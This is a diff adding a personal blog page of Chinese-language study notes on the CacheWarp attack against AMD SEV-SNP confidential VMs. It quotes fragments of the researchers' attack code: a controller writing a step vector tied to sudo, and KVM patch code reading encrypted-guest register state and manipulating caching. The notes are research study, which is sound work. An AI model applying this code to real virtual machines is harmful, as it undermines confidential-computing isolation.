@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"szy0127.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"preload":true}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="CacheWarpsnp用的是sev-step&#x2F;sev-step: This repo tracks a compatible state of all sev step components and contains script to easily install everything required to setup a sev vm (github.com) CacheWarp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CacheWarp">
+<meta property="og:url" content="http://szy0127.github.io/2024/09/17/papers/CacheWarp/index.html">
+<meta property="og:site_name" content="S blog">
+<meta property="og:description" content="CacheWarpsnp用的是sev-step&#x2F;sev-step: This repo tracks a compatible state of all sev step components and contains script to easily install everything required to setup a sev vm (github.com) CacheWarp">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-17T11:48:03.584Z">
+<meta property="article:modified_time" content="2024-09-17T11:48:03.597Z">
+<meta property="article:author" content="szy">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://szy0127.github.io/2024/09/17/papers/CacheWarp/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://szy0127.github.io/2024/09/17/papers/CacheWarp/","path":"2024/09/17/papers/CacheWarp/","title":"CacheWarp"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CacheWarp | S blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">S blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CacheWarp"><span class="nav-number">1.</span> <span class="nav-text">CacheWarp</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">szy</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/09/17/papers/CacheWarp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="szy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="S blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CacheWarp | S blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CacheWarp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-09-17 19:48:03" itemprop="dateCreated datePublished" datetime="2024-09-17T19:48:03+08:00">2024-09-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>733</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>3 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="CacheWarp"><a href="#CacheWarp" class="headerlink" title="CacheWarp"></a>CacheWarp</h1><p>snp用的是<a target="_blank" rel="noopener" href="https://github.com/sev-step/sev-step">sev-step&#x2F;sev-step: This repo tracks a compatible state of all sev step components and contains script to easily install everything required to setup a sev vm (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cispa/CacheWarp/blob/main/kernel-patch/kernel.patch">CacheWarp&#x2F;kernel-patch&#x2F;kernel.patch at main · cispa&#x2F;CacheWarp (github.com)</a></p>
+<p>SEV_STEP_FLAG_BASE_PFN   sev_step_page_va  和user通信地址</p>
+<p>intr_interception 核心逻辑</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cispa/CacheWarp/blob/main/userspace-controller/cachewarp/cachewarp.c">CacheWarp&#x2F;userspace-controller&#x2F;cachewarp&#x2F;cachewarp.c at main · cispa&#x2F;CacheWarp (github.com)</a></p>
+<p>sev_step_kernel_sync_addr_p 和step框架通信</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sev_step_kernel_sync_addr_p = libtea_map_physical_address_range(instance, KERNEL_SYNC_PA, <span class="number">4096</span>, PROT_READ | PROT_WRITE, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">memset</span>(sev_step_kernel_sync_addr_p, <span class="number">0</span>, <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> vec[<span class="number">100</span>] = &#123;<span class="number">44</span>, <span class="number">0</span>,<span class="number">8</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>, <span class="number">8</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>, <span class="number">0</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> ,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x201</span>, <span class="number">1</span>,<span class="number">0x101</span>,<span class="number">0x101</span>,<span class="number">3</span>,<span class="number">0x11</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">0x41</span>,<span class="number">0x41</span>,<span class="number">0x5</span>, <span class="number">1</span>,<span class="number">0x11</span>,<span class="number">0x21</span>,<span class="number">0x20</span>,<span class="number">1</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>, <span class="number">0x21</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x3000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= vec[<span class="number">0</span>]; i++)</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;movw %1, (%0)\n\t&quot;</span>:: <span class="string">&quot;r&quot;</span>(sev_step_kernel_sync_addr_p+<span class="number">16</span>+<span class="number">2</span>*i),<span class="string">&quot;r&quot;</span>(vec[i]):)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>vec攻击向量 和sudo的binary有关</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cispa/CacheWarp/tree/main/sudo">CacheWarp&#x2F;sudo at main · cispa&#x2F;CacheWarp (github.com)</a></p>
+<p>用到libtea 是usenix security22提供的一套框架 不用自己写一大堆难懂的汇编 并且屏蔽掉平台的差异</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/libtea/frameworks/blob/master/libtea/src/libtea_common.c">frameworks&#x2F;libtea&#x2F;src&#x2F;libtea_common.c at master · libtea&#x2F;frameworks (github.com)</a></p>
+<p>vec记录了一串数值 是step指令的序列</p>
+<p>vmsa layout 记录在手册中</p>
+<p><a target="_blank" rel="noopener" href="https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf">https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf</a></p>
+<p>Table B-4. VMSA Layout, State Save Area for SEV-ES</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">vmsa_paddr = svm-&gt;vmcb-&gt;control.vmsa_pa;</span><br><span class="line"></span><br><span class="line">rsp = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x1d8</span>);</span><br><span class="line">rbp = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x328</span>);</span><br><span class="line">rax = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x1f8</span>);</span><br><span class="line">rcx = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x308</span>);</span><br><span class="line">rdx_rbx = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x310</span>);</span><br><span class="line">rsi_rdi = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x330</span>);</span><br><span class="line">r8_r9   = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x340</span>);</span><br><span class="line">r10_r11 = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x350</span>);</span><br><span class="line">r12_r13 = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x360</span>);</span><br><span class="line">r14_r15 = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x370</span>);</span><br><span class="line">xmm = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x470</span>);</span><br><span class="line">ymm = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x570</span>);</span><br><span class="line">cs  = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x10</span>);</span><br><span class="line">ss  = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x20</span>);</span><br><span class="line">reg_vector = ((last_vmsa_rsp != rsp) &lt;&lt; <span class="number">0</span>) + ((last_vmsa_rbp != rbp) &lt;&lt; <span class="number">1</span>) + \</span><br><span class="line">						((last_vmsa_rax != rax) &lt;&lt; <span class="number">2</span>) 		   + ((last_vmsa_rcx != rcx) &lt;&lt; <span class="number">3</span>) + \</span><br><span class="line">						((last_vmsa_rdx_rbx != rdx_rbx) &lt;&lt; <span class="number">4</span>)  + ((last_vmsa_rsi_rdi != rsi_rdi) &lt;&lt; <span class="number">5</span>) + \</span><br><span class="line">						((last_vmsa_r8_r9 != r8_r9) &lt;&lt; <span class="number">6</span>) 	   + ((last_vmsa_r10_r11 != r10_r11) &lt;&lt; <span class="number">7</span>) + \</span><br><span class="line">						((last_vmsa_r12_r13 != r12_r13) &lt;&lt; <span class="number">8</span>)  + ((last_vmsa_r14_r15 != r14_r15) &lt;&lt; <span class="number">9</span>) + \</span><br><span class="line">						((last_vmsa_xmm != xmm) &lt;&lt; <span class="number">10</span>) 		   + ((last_vmsa_ymm != ymm) &lt;&lt; <span class="number">11</span>) + \</span><br><span class="line">						((last_vmsa_cs != cs) &lt;&lt; <span class="number">12</span>) 		   + ((last_vmsa_ss != ss) &lt;&lt; <span class="number">13</span>);</span><br><span class="line"><span class="keyword">if</span> (reg_vector != *((<span class="keyword">volatile</span> u16 *)(sev_step_page_va + PATH_OFFSET + path_index*<span class="number">2</span>))) &#123;</span><br><span class="line">						find_target = <span class="literal">false</span>;</span><br><span class="line">						printk(<span class="string">&quot;dismatch %dth Instr! the vector is 0x%x\n&quot;</span>, path_index, reg_vector);</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<p>user 先设置flag  kvm把所有页表present bit设为0 guest触发NPF</p>
+<p>kvm拿到gpa 设置APIC</p>
+<p>小于阈值 0step 大于阈值 &gt;&#x3D;1step</p>
+<p>观察RIP看是0还是非0</p>
+<p>snp增加了freshness 寄存器一样密文也会变 可以用sev-step的performance counter</p>
+<p>由于vmsa的cache 导致每次context switch时间不稳定 因此用MTRR标记为不可缓存 并且用wbinvd解决AMD CPU可能stale的问题</p>
+<p>NPF的作用是啥</p>
+<blockquote>
+<p>To ensure consistent conditions for every stepping, the hypervisor always clears the present bit of the last fault page when handling the APIC timer interrupt, i.e., an NPF is always triggered before the next APIC interrupt.  </p>
+</blockquote>
+<p>为了控制变量 保证时间稳定？感觉几乎没有用</p>
+<ol>
+<li>run的汇编每次固定apic timer 可以step</li>
+<li>sev-step没有提到page fault</li>
+</ol>
+<p>是否只是拿个gpa 方便找pattern？</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted, (u32*)(APIC_BASE + APIC_TMICT), apic_interval, wbnoinvd);</span><br><span class="line">SYM_FUNC_START(__svm_sev_es_vcpu_run)</span><br><span class="line">    movl %_ASM_ARG4L, (%_ASM_ARG3)</span><br></pre></td></tr></table></figure>
+
+<p>攻击触发点：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">ctrl_thread</span><span class="params">(<span class="type">void</span>* dummy)</span> &#123; </span><br><span class="line">	</span><br><span class="line">	pin_to_core(ASSIST_CORE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// hook kvm_exit_handler in the kernel </span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;movq %1, (%0)\n&quot;</span>::<span class="string">&quot;r&quot;</span>(sev_step_kernel_sync_addr_p),<span class="string">&quot;r&quot;</span>(flag):)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Wait until the attack finishes */</span></span><br><span class="line">	<span class="keyword">while</span> (*(<span class="type">uint32_t</span>*)(sev_step_kernel_sync_addr_p)) &#123;sched_yield();&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">intr_interception</span><br><span class="line">    <span class="comment">/* Start */</span></span><br><span class="line">    <span class="keyword">if</span> (zero_stepping_time == <span class="number">0</span> &amp;&amp; non_zero_stepping_time == <span class="number">0</span>) &#123;</span><br><span class="line">        kvm_unpre_all(vcpu-&gt;kvm, svm-&gt;vmcb-&gt;control.asid);</span><br><span class="line">        svm_flush_tlb_current(vcpu);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Mark VMSA into UC will make `VMRUN` updates all vmsa state in cache */</span></span><br><span class="line">        <span class="keyword">if</span> (uc_vmsa) &#123;</span><br><span class="line">            mtrr_uc_page(vmsa_paddr, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Avoid to drop smth dirty data and freeze the system</span></span><br><span class="line"><span class="comment">			 * wbnoinvd is enough to make it reliable</span></span><br><span class="line"><span class="comment">			 * wbinvd also works, but it takes longer time</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">        <span class="keyword">if</span> (invd) &#123;</span><br><span class="line">            <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;wbnoinvd\n\t&quot;</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>ssh 怎么利用page fault一起找的？</p>
+<p>npf_interception intr_interception svm_vcpu_enter_exit三者关系是什么？</p>
+<p>exit之后不就是NPF或者INTR 为什么急着先处理？</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/09/17/misc/react-native-note/" rel="prev" title="react-native 开发记录">
+                  <i class="fa fa-angle-left"></i> react-native 开发记录
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/09/17/papers/cipherH/" rel="next" title="CipherH">
+                  CipherH <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">szy</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">62k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">3:44</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
